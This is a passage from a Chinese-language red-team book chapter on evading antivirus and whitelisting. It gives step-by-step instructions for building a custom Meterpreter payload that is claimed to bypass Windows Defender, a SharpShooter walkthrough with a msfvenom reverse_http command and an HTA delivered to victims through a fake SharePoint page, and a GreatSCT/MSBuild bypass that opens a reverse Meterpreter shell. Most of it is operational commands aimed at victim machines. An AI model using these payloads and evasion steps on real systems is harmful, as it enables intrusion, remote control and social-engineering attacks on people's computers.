> 参考资料: [Meterpreter
> 载荷执行原理分析](https://xz.aliyun.com/t/1709){.pcalibre2 .calibre9
> .pcalibre .pcalibre1 target="_blank"}
>
> 1.  关于 `stage 0`{.calibre14 .pcalibre4 .pcalibre3} 了解更多: [探寻
>     Metasploit Payload
>     模式背后的秘密](https://www.freebuf.com/articles/system/187312.html){.pcalibre2
>     .calibre9 .pcalibre .pcalibre1 target="_blank"}
这里提供的 payload
具体示例具有一些更高级的功能。这样做是为了使它成为地址无关代码（PIC），并且不需要导入。这段代码是基于
thealpiste 的代码开发的 (
[https://github.com/thealpiste/C_ReverseHTTPS_Shellcode](https://github.com/thealpiste/C_ReverseHTTPS_Shellcode){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"} )。
提供的示例 payload 执行以下操作：
-   所有代码都在内存中定位 DLL
    和函数以便执行;无需导入任何模块。这是通过手动为所有使用的函数[打桩](https://blog.csdn.net/wangwencong/article/details/8189778){.pcalibre2
    .calibre9 .pcalibre .pcalibre1
    target="_blank"}，然后在内存中搜索它们来实现的。
-   使用 Wininet 将实际的 HTTPS 请求执行回配置的 Metasploit 处理程序。
-   接收 `metsrv.dll`{.calibre14 .pcalibre4 .pcalibre3}，并执行 blob
    数据。Metasploit
    为这些文件提供服务的方式，意味着入口点是缓冲区的开头。
这个功能是与执行 msfvenom 中构建的 payload
完全相同的过程。然而，msfvenom
以一种容易被预测和检测到的方式将这些添加到模板可执行程序中，并且这种方式是不可配置的。因此，大多数杀毒软件一直可以识别到它们。但是，仅仅需要一点编码技巧，你就可以重新编写这个
payload 的功能。重写的 payload
很小，并且可以绕过当前存在的任何检测。在撰写本文时，已经测得此 payload
可以绕过所有杀毒软件，包括 Windows Defender。
创建 payload（完整的 payload
位于[这里](http://bit.ly/2ELYkm8){.pcalibre2 .calibre9 .pcalibre
.pcalibre1 target="_blank"}）：
-   在 VS 2013中，打开
    metasploit-payloads\\c\\x64_defender_bypass\\x64_defender_bypass.vcxproj
-   在 x64_defender_bypass 下有一个 settings.h 文件。打开此文件并将 HOST
    和 PORT 信息修改为你的 Meterpreter 处理程序（handler）信息。
-   确保将构建模式设置为 `Release`{.calibre14 .pcalibre4 .pcalibre3}
    并编译 `x64`{.calibre14 .pcalibre4 .pcalibre3}
-   保存并构建
-   在
    `metasploit-payloads\c\x64_defender_bypass\x64\Release`{.calibre14
    .pcalibre4 .pcalibre3} 下，将创建一个新的二进制文件
    `x64_defender_bypass.exe`{.calibre14 .pcalibre4
    .pcalibre3}。在运行了 Windows Defender 的受害计算机上执行此
    payload。当此项目构建成功，Windows Defender 不能检测到这个 payload。
你现在拥有一个深度混淆过的 Meterpreter
二进制文件和混淆过的传输层，以绕过所有默认的保护。现在这仅仅是一个让你入门的
POC。只要本书一发布，我可以预见到其中一些技术不久就会被检测出签名。你还可以采取更多措施来更好地规避检测工具。例如，你可以：
-   使用 clang 混淆工具链来构建
-   对所有字符串使用字符串加密库
-   更改 Meterpreter 入口点（目前是 Init ）
-   创建一个自动化脚本，为所有 payload 类型添加空指令（nops）
-   编辑 payload 生成的实际 ruby，以便在每次运行时随机化 payload
## SharpShooter {#7_the_quarterback_sneak_evading_av_and_network_detection.html#sharpshooter .calibre12}
作为红队队员，最耗时的事情之一就是创建可以躲避新一代杀毒软件和沙盒安全机制的
payload。我们一直在寻找新的方法来创建我们的初始 `stager`{.calibre14
.pcalibre4 .pcalibre3}。一个名为 `SharpShooter`{.calibre14 .pcalibre4
.pcalibre3} 的工具采用了许多反沙盒技术和 James Forshaw 的
DotNetToJScript 来执行 Windows 脚本格式的
shellcode（CACTUSTORCH工具------
[https://github.com/mdsecactivebreach/CACTUSTORCH](https://github.com/mdsecactivebreach/CACTUSTORCH){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"} ）。
摘自 [MDSec 网站对于 SharpShooter
的描述](https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"}："SharpShooter 支持
`staged`{.calibre14 .pcalibre4 .pcalibre3} 和 `stageless`{.calibre14
.pcalibre4 .pcalibre3} 这两种类型 payload 的执行。`staged`{.calibre14
.pcalibre4 .pcalibre3} 执行可以在 HTTP/HTTPSS、DNS 或 HTTP/HTTPS 与 DNS
相结合等这些情况下进行。当一个 `staged`{.calibre14 .pcalibre4
.pcalibre3} payload 执行时，它将尝试检索已经压缩的 `C#`{.calibre14
.pcalibre4 .pcalibre3} 源代码文件，之后使用所选的传输技术进行 base64
编码。随后在主机上使用 .NET CodeDom 动态编译器对 `C#`{.calibre14
.pcalibre4 .pcalibre3}
源代码进行下载和编译。然后使用反射从源代码执行所需的方法。"
让我们快速把一个示例走一遍：
-   python SharpShooter.py \--interactive
-   1 - For .NET v2
-   Y - Staged Payload
-   1 - HTA Payload
-   可以选择使用以下防沙盒技术：
    -   你可以选择你想用的技术来绕过沙盒机制从而成功的执行你的恶意软件。
    -   \[1\] Key to Domain
    -   \[2\] 确保 Domain 加入
    -   \[3\] 检查沙盒痕迹
    -   \[4\] 检查错误的 MAC 地址
    -   \[5\] 检查调试
-   1 - 网络传输
-   Y - 内置 shellcode 模板
-   shellcode 作为一个字节数组
    -   打开一个新终端并创建一个 C# 语言的 Meterpreter payload
    -   msfvenom -a x86 -p windows/meterpreter/reverse_http
        LHOST=10.100.100.9 LPORT=8080 EnableStageEncoding=True
        StageEncoder=x86/shikata_ga_nai -f csharp
    -   复制 `{`{.calibre14 .pcalibre4 .pcalibre3} 和 `}`{.calibre14
        .pcalibre4 .pcalibre3} 之间的所有内容并作为字节数组提交
-   为 C# 网络传输提供 URI
    -   输入攻击者机器的IP/端口和文件。示例：[http://10.100.100.9/malware.payload](http://10.100.100.9/malware.payload){.pcalibre2
        .calibre9 .pcalibre .pcalibre1 target="_blank"}
-   提供输出文件的文件名
    -   恶意软件
-   Y - 你想将 payload 嵌入到 HTML 文件中吗？
-   使用自定义（1）或预定义（2）模板
    -   要进行测试，请选择任意预定义模板
-   将新创建的恶意文件移动到你的 Web 目录下
    -   mv output/\* /var/www/html/
-   为你的 payload 建立一个 Meterpreter 处理程序（handler）
配置和开发了恶意软件后，将其移至 Web
目录（malware.hta，malware.html，malware.payload），启动 apache2
服务，然后启动你的 Meterpreter
处理程序。你现在已经做好准备，通过诱导受害者访问你的恶意站点来对其发动社会工程学攻击！下图中给出的示例是
Sharpshooter 的 SharePoint 在线模板。当受害者使用 IE/Edge
浏览器访问你的恶意网页时，HTA
会自动下载并提示运行。一旦显示了提示并选择运行的话，stager payload
就会运行，下载辅助 payload（满足沙箱控件的情况下），并在内存中执行我们的
Meterpreter payload。
![](7-4.png){.calibre11}
补充信息：
-   [https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/](https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
-   [https://github.com/mdsecactivebreach/SharpShooter](https://github.com/mdsecactivebreach/SharpShooter){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
## 应用程序白名单绕过 {#7_the_quarterback_sneak_evading_av_and_network_detection.html#应用程序白名单绕过 .calibre12}
我们已经讨论了在不运行 PowerShell 代码的情况下触发 PowerShell
的不同方法，但如果你无法在 Windows
系统上运行自定义二进制文件，该怎么办？"应用绕过"的概念就是查找可以执行我们
payload 的默认 Windows
二进制文件。我们一直受限于一些环境因素比如域控（DC）的锁定机制，只能进行有限的代码执行。我们可以使用一些不同的
Windows 文件来绕过这些限制，让我们来看看它们中的几个。
一个经常被讨论的可以用于绕过应用白名单的 Windows 二进制文件是
`MSBuild.exe`{.calibre14 .pcalibre4 .pcalibre3}。什么是
`MSBuild.exe`{.calibre14 .pcalibre4 .pcalibre3}，它有什么作用？ MSBuild
是 .NET 框架中的一个默认应用，它是使用 XML 格式的项目文件构建 .NET
应用程序的平台。我们可以对 MSBuild 使用 XML
项目文件格式这个特性进行利用，我们可以使用名为 GreatSCT
的工具创建我们自己的恶意 XML 项目文件来执行 Meterpreter
会话，从而利用此特性。
[GreatSCT](https://github.com/GreatSCT/GreatSCT){.pcalibre2 .calibre9
.pcalibre .pcalibre1 target="_blank"}
有我们可以使用的各种应用白名单绕过的方式，但我们只将介绍
MSBuild。在此示例中，我们将创建一个托管 reverse_http Meterpreter
会话的恶意 XML 文件。这将要求我们将 XML 文件写入受害系统并使用 MSBuild
来执行该 XML 文件：
-   git clone
    [https://github.com/GreatSCT/GreatSCT.git](https://github.com/GreatSCT/GreatSCT.git){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"} /opt/
-   cd /opt/GreatSCT
-   python3 ./gr8sct.py
-   \[4\] MSBUILD/msbuild.cfg
-   填写你的主机IP\[0\]和端口\[1\]
-   生成
-   使用 Metasploit 创建一个新的 windows/meterpreter/reverse_http
    的监听器
![](7-5.png){.calibre11}
在我们的 Kali 实例中，我们使用 GreatSCT 来创建
`shellcode.xml`{.calibre14 .pcalibre4 .pcalibre3}
文件，该文件包含构建信息和一个 Meterpreter 反向 http
shell。需要将此文件移动到受害系统并使用 MSBuild 进行调用。
\*注意：我观察到 GreatSCT 项目正在 [develop
分支](https://github.com/GreatSCT/GreatSCT/tree/develop){.pcalibre2
.calibre9 .pcalibre .pcalibre1
target="_blank"}上进行活跃的开发，其中包括 https Meterpreter
和其他应用程序白名单绕过命令执行。我估计在本书发布之前，就会被合并到
master 分支。
![](7-6.png){.calibre11}
在 Windows 受害者计算机上执行文件调用后，使用
`C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe shellcode.xml`{.calibre14
.pcalibre4 .pcalibre3} 命令，.NET 将开始构建 shellcode.xml
文件。在此过程中，将在受害者计算机上生成一个反向 http Meterpreter
会话来绕过任何应用程白名单。你可能希望编辑 shellcode.xml
文件以插入经过混淆的 payload，因为 Meterpreter 默认的 payload
很可能会触发杀毒软件。